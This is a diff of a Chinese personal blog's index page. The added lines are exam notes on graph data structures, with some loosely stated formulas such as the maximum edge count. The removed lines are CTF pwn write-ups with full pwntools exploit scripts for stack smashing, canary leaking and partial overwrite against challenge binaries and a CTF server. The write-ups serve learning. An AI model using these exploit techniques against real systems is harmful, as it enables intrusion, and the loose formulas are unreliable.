+<li>最小生成树不唯一，其总权重为23</li>
+<li>最小生成树唯一，其总权重为20</li>
+<li>边(B, F)一定在树中，树的总权重为23</li>
+<li>边(H, G)一定在树中，树的总权重为20</li>
+</ul>
+<p>会Prime就完事了，怎么判断是不是唯一呢？这个还挺麻烦的，简单说一下吧，当我们在利用Prime遍历边的时候，一旦遇见权值相同而且还不能用到你现在图里的就给你选的那个边做个标记（注意是你用的那个，不是重复的那些），而最后求的的MST如果没有这样的边就说明了生成树唯一，如果有标记了的边，那么就把这些边去了再看看能不能凑出一个MST来。<br>这题判断是否唯一很简单，因为最后一步9的时候就有好几条线可以用，所以一定不唯一</p>
+<p><strong>2-13下图为一个AOV网，其可能的拓扑有序序列为</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fyb1qavg1ij30j608iq4a.jpg" alt=""><br>拓扑有序排列怎么玩呢？很简单，就是不停的删除入度为0的结点和其相关的边就好了。比如在这个题目里，我们先删除的应该是A，然后接着看，删除后B、D的入度变为了0，选择其中一个删除，重复直至所有的顶点都被我们取出来即可。</p>
+<p><strong>2-14若将n个顶点e条弧的有向图采用邻接表存储，则拓扑排序算法的时间复杂度是</strong><br>n+e，记住吧</p>
+<p><strong>2-14若将n个顶点e条弧的有向图采用邻接表存储，则拓扑排序算法的时间复杂度是：</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fyb1x9a76uj30ia06ut9h.jpg" alt=""><br>分享一个技巧，首先一开始只有A没有入度，所以开头一定是A，其次，B没有出度，所以B一定是最后一个，也就是A。。。B，我们删除A、B循环这个思想就完事了。<br>这里删除之后发现有个单独的e和另外一个图，那么e随时都可以插入所以就是3种位置，删除e，剩下的bc只有一种情况。<br>随意就是3种了。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/15/数据结构基础—图（上）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/15/数据结构基础—图（上）/" itemprop="url">数据结构基础—图（上）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-15T16:50:14+08:00">
+                2018-12-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="图的基本概念"><a href="#图的基本概念" class="headerlink" title="图的基本概念"></a>图的基本概念</h2><p>最近因为各种考试（四级怕不是要明年再见了）消失了一段时间，也攒了一堆想要写的东西，不过后面几周还是有一轮接着一轮的考试，所以估计又要不定期鸽了。话说图这一章抄了别人的答案，结果选择题都没及格，唉，还是得自己老老实实做啊</p>
+<p><strong>1-1无向连通图至少有一个顶点的度为1。</strong><br>想个特殊情况，只有一个顶点的图</p>
+<p><strong>1-2用邻接表法存储图，占用的存储空间数只与图中结点个数有关，而与边数无关。</strong><br><strong>1-3用邻接矩阵法存储图，占用的存储空间数只与图中结点个数有关，而与边数无关。</strong><br>图的存储主要就是邻接表和邻接矩阵了，而前者因为要保存顶点和其边的信息所以空间应该为v+e，而后者则是利用矩阵来表示每两个顶点之间的关系所以只和顶点个数有关</p>
+<p><strong>1-4在一个有向图中，所有顶点的入度与出度之和等于所有边之和的2倍。</strong><br>这个很好想吧，一个线有两个度，所以你计算的度要除于2</p>
+<p><strong>1-5在任一有向图中，所有顶点的入度之和等于所有顶点的出度之和。</strong><br>有来有回，来而不往非礼也</p>
+<p><strong>1-6如果无向图G必须进行两次广度优先搜索才能访问其所有顶点，则G中一定有回路。</strong><br>要是那样的话BFS岂不是太弱了，人家本来就是可以找到所有顶点的，这里应该是说明图不连通的……提一下BFS在无向图找回路的问题吧，其实很好想象，如果一个无向图他没有环的话不就是个树嘛，假设我们层序遍历时发现某个顶点竟然还有个边，那不就说明他有回路了嘛。</p>
+<blockquote>
+<p>（1）通过广度遍历（BFS）访问图的所有点，对于每个点，都检测和已访问过的点是否有边（除了和它连接的上层节点）。<br>（1.1）如果有边，说明有回路（有环）。如果对于每个点，都没有和已访问过的点有边，说明从该点出发的当前图没有回路（无环）。<br>（2）如果从任意点开始的BFS，以上操作（1）均说明无回路，则没有回路。</p>
+</blockquote>
+<p><strong>1-7如果无向图G必须进行两次广度优先搜索才能访问其所有顶点，则G一定有2个连通分量。</strong><br>这是对的，唯一可以让BFS断开的就是“没有桥的大陆”，而一个“大陆”就是一个连通分量</p>
+<p><strong>1-8无向连通图所有顶点的度之和为偶数。</strong><br>上面提到了，一个边有两度，所以你的度的和肯定是整数倍啦</p>
+<p><strong>1-9无向连通图边数一定大于顶点个数减1。</strong><br>顶点个数减1这个是不是很眼熟啊？这是树有n个结点的边数，那边没有方向的树是不是图啊？那肯定是啊</p>
+<p><strong>2-1若无向图G =（V，E）中含10个顶点，要保证图G在任何情况下都是连通的，则需要的边数最少是：</strong><br>这题和上面的一样，既然是最少了那就考虑树的形状，n-1即可</p>
+<p><strong>2-2给定一个有向图的邻接表如下图，则该图有?个强连通分量。</strong><br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fy7lykfe1sj30ca08q3z1.jpg" alt=""><br>首先把只有出度的点直接拿走就行了，因为你弄死它它也回不来<br>之后我们就以0作为开始，那么0可以找到5，5可以找到1，1有两个出度所以就要开始分类了<br>走0的话就可以回到之前走过的点了，所以这些点也就一定是一个连通分量里的了，这种情况over。<br>走3的话又可以走两个，再次分开<br>走的是0的话又回到了已经经过的点，所以他们是一个连通分量的，over（此时这组连通分量已经有了0，5，1，3）<br>走的是4的话到头了，所以4单独拿出来成一个连通分量。<br>剩下一个2没有被找到过，所以也是一个连通分量。</p>
+<p><strong>2-3给定有向图的邻接矩阵如下：</strong><br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fy7r12jsrbj307g05ydft.jpg" alt=""><br><strong>顶点2（编号从0开始）的出度和入度分别是：</strong><br>横看成岭侧成峰，远近高低…呃，跑题了，这个就是横竖看的问题，因为是2所以我们锁定第三行的时候就是2“出去”的情况，而当我们锁定第三列的时候就是“进入”2的情况了</p>
+<p><strong>2-4下面给出的有向图中，有?个强连通分量。</strong><br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fy7r5ccowqj308e05y74p.jpg" alt=""><br>答案为<em>2 ({1,2,3,4}, {0})</em>又是找强连通分量的题目，唉，真麻烦，思路还是刚才那样，不说了。</p>
+<p><strong>2-5下面给出的有向图中，各个顶点的入度和出度分别是（图片和上面的一一样）：</strong><br>这个查查就行了，不说了</p>
+<p><strong>2-6如果G是一个有36条边的非连通无向图，那么该图顶点个数最少为多少？</strong><br>这个首先考虑一下无向图（先忽略非连通）的最大边数，每个点可以和他之外的所有顶点有边，所以就应该是n*(n-1)条边。令这个等于36，解得n等于9，又因为题目是非连通的，所以我们再加一个点，也就是10</p>
+<p><strong>2-7下面关于图的存储的叙述中，哪一个是正确的？</strong><br>又是关于存储的问题，表是v+e，矩阵是n的平方，不说了</p>
+<p><strong>2-8关于图的邻接矩阵，下列哪个结论是正确的？</strong><br>选项不想放出来，一句话就是无向图矩阵一定对称，有向图不一定对称</p>
+<p><strong>2-9设N个顶点E条边的图用邻接表存储，则求每个顶点入度的时间复杂度为：</strong><br>看见这种题无脑选v+e就对了。。。。很好想，你在表里要先遍历v找到你要的点，然后在v的e域里再找各个边统计一遍，很显然是这个答案</p>
+<p><strong>2-10在一个无向图中，所有顶点的度数之和等于所有边数的多少倍？</strong><br><strong>2-11在一个有向图中，所有顶点的入度与出度之和等于所有边之和的多少倍？</strong><br>一个边俩度，肯定是2倍</p>
+<p><strong>2-13设无向图的顶点个数为N，则该图最多有多少条边？</strong><br>怎么老是这种问题。。。不写了</p>
+<p><strong>2-14下列关于无向连通图特征的叙述中，正确的是：</strong><br><strong> 1   所有顶点的度之和为偶数</strong><br><strong> 2   边数大于顶点个数减1</strong><br><strong> 3   至少有一个顶点的度为1</strong><br>很显然只有1是对的，其实2、3前面也都说过了，2是因为树也是无向连通图，3是特殊情况一个点的时候</p>
+<p><strong>2-15若无向图G =（V，E）中含7个顶点，要保证图G在任何情况下都是连通的，则需要的边数最少是：</strong><br>这个题说实话有点心机boy了，注意它说的是<em>任何情况</em>，还得是<em>最少边数</em>，这咋办呐？其实很简单，任何情况就是说不管边怎么摆你都保证连通，那么为了应对某些熊（chu）孩（ti）子（ren）把所有的边都扔到一两个点这种情况，我们就得保证边的数量足够多。多是多少呢？n乘以n-1除以2？当然不是了，我们只需要“喂饱”前n-1个点就成你了，最后一个点一个边连起来就成了（因为前n个点都吃饱了不可能放得下了，只可能连到最后一个点），所以答案是6乘以5再除以2，最后加1.</p>
+<p><strong>2-16在N个顶点的无向图中，所有顶点的度之和不会超过顶点数的多少倍？ </strong><br>简单了，最多的是边的个数是n乘以n-1除以2，度是边的二倍，也就是n乘以n-1，也就是n-1倍啦</p>
+<p><strong>2-17对于一个具有N个顶点的无向图，要连通所有顶点至少需要多少条边</strong><br>就是树呗，n-1就完事了</p>
+<p><strong>2-18具有N（N>0）个顶点的无向图至多有多少个连通分量？</strong><br>N个呗，所有点都不连通的时候</p>
+<p><strong>2-19一个有N个顶点的强连通图至少有多少条边？</strong><br>强连通也就是是有向图的连通，围个圈不就是最小情况了嘛。</p>
+<p><strong>2-20如果G是一个有28条边的非连通无向图，那么该图顶点个数最少为多少</strong><br>这个眼熟啊，n乘以n-1 = 56呗，算出来是8，再加上个单独的不让它连通的点，也就是9</p>
+<p><strong>2-21对于有向图，其邻接矩阵表示比邻接表表示更易于：</strong><br>唯一的好处就是求入度方便了，求别的都半斤八两</p>
+<p><strong>2-22对于一个具有N个顶点的无向图，若采用邻接矩阵表示，则该矩阵的大小是：</strong><br>太简单了，n的方</p>
+<p><strong>2-23若一个有向图用邻接矩阵表示，则第i个结点的入度就是：</strong><br>第i列的非零元素个数，入度看列，出度看行，over</p>
+<p><strong>2-24下列选项中，不是下图深度优先搜索序列的是：</strong><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fy8med822kj30cw08m0tp.jpg" alt=""><br>这个太简单了，不说了</p>
+<p><strong>2-27已知无向图G含有16条边，其中度为4的顶点个数为3，度为3的顶点个数为4，其他顶点的度均小于3。图G所含的顶点个数至少是：</strong></p>
+<p>16条边也就是32个度，3x4，4x3一共是24度，还剩8度，因为都小于3，所以我们就认为都是2，也就是4个，加起来一共11个</p>
+<p><strong>2-29图的广度优先遍历类似于二叉树的：</strong><br>广度层序，深度中序</p>
+<p><strong>2-33如果从无向图的任一顶点出发进行一次深度优先搜索可访问所有顶点，则该图一定是：</strong><br>连通图呗，你只要连通这两种遍历方法都可以找到所有的顶点</p>
+<p>其他的题目基本上就是以上题目的变形或者是无脑重复，不说了。</p>
+<p>Successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/27/pwn学习（10）jarvis栈部分（一）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -689,1610 +2195,11 @@ sh.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/23/pwn学习（8）smashes练习及回顾/" itemprop="url">pwn学习（8）smashes练习及一周总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T20:27:19+08:00">
-                2018-11-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。</p>
-<h1 id="stack-smashes练习"><a href="#stack-smashes练习" class="headerlink" title="stack smashes练习"></a>stack smashes练习</h1><p>题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg" alt=""><br>首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。</p>
-<p>看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg" alt=""></p>
-<p>拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg" alt=""><br>明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。</p>
-<p>程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。</p>
-<p>那就说明我们要分三步走：</p>
-<ul>
-<li>利用smashes获取libc中的函数，比如puts</li>
-<li>利用smashes获取environ</li>
-<li>利用smashes获取flag</li>
-</ul>
-<p>那就来看看exp吧</p>
-<pre><code>from pwn import *
-arg0_addr = 0x7fffffffdf68
-input_addr = 0x7fffffffde40
-#context.log_level = &apos;debug&apos;
-p = process(&apos;./GUESS.dms&apos;)
-elf = ELF(&apos;./GUESS.dms&apos;)
-e = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
-
-flag_addr = 0x7fffffffde10
-puts_addr = 0x602020
-p.recvuntil(&apos;flag&apos;)
-payload = (arg0_addr - input_addr)*&apos;a&apos; +p64(puts_addr)
-p.sendline(payload)
-p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
-puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
-log.info(hex(puts_addr))
-
-libc = puts_addr - e.symbols[&apos;puts&apos;]
-environ_addr = libc + e.symbols[&apos;__environ&apos;]
-log.info(hex(libc))
-
-p.recvuntil(&apos;flag&apos;)
-p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(environ_addr))
-p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
-stack = u64(p.recv(6).ljust(8, &apos;\x00&apos;))
-log.info(hex(stack))
-
-flag_addr = stack - 0x168
-
-p.recvuntil(&apos;flag&apos;)
-p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(flag_addr))
-
-p.interactive()
-</code></pre><p>各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.</p>
-<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>这一周主要是学习了基础的ROP和花式溢出，另外还有一些格式化字符串漏洞的相关知识，当然除此之外还有一些pwntools的使用技巧和peda的调试技巧，也不知道这样的速度合不合适，但自己感觉需要好好总结回顾一下了，之后会利用周六把这周的东西重新捋一遍，看看还有没有什么新的发现或者是遗漏。</p>
-<p>sucessful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/22/pwn学习（7）花式栈溢出2/" itemprop="url">pwn学习（7）花式栈溢出2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
-                2018-11-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
-<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
-<p>如图就是函数在开始时进行的设置“哨位”</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
-<p>这是在函数最后的检查</p>
-<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
-<p>可以看到除了程序的输出外，还额外打印了一句</p>
-<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
-</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
-<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-{
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-}
-</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
-<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
-<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
-<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
-<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
-<pre><code>from pwn import *
-#p = process(&apos;./smashes.dms&apos;)
-p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
-flag_addr = 0x400d21
-arg0_addr = 0x7fffffffdf48
-name_addr = 0x7fffffffdd30
-payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
-
-p.recvuntil(&apos;name? &apos;)
-p.sendline(payload)
-p.recvuntil(&apos;flag: &apos;)
-p.sendline(&apos;bb&apos;)
-data = p.recv()
-log.info(data)
-</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
-<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
-<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
-<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
-<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
-<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
-<p>思路齐全，上exp喽</p>
-<pre><code>#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-#  context.log_level = &quot;debug&quot;
-
-
-while True:
-    try:
-        io = process(&quot;./babypie.dms&quot;, timeout = 1)
-
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
-        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
-        canary = &apos;\0&apos; + io.recvn(7)
-        success(canary.encode(&apos;hex&apos;))
-
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
-
-        io.interactive()
-    except Exception as e:
-        io.close()
-        print e
-</code></pre><p>Successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/pwn学习（6）花式栈溢出1/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/21/pwn学习（6）花式栈溢出1/" itemprop="url">pwn学习（6）花式栈溢出1</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T19:22:14+08:00">
-                2018-11-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>因为今天满课，实在是没有抽出太多时间来学习pwn的知识，只能趁着上英语课的功夫学习了一下关于stack pivoting的知识，这也是ctf wiki中花式栈溢出的第一部分。另外还做了前几道pwnable的题目，因为难度较低所以还在考虑要不要等到之后一块放出来。。。。</p>
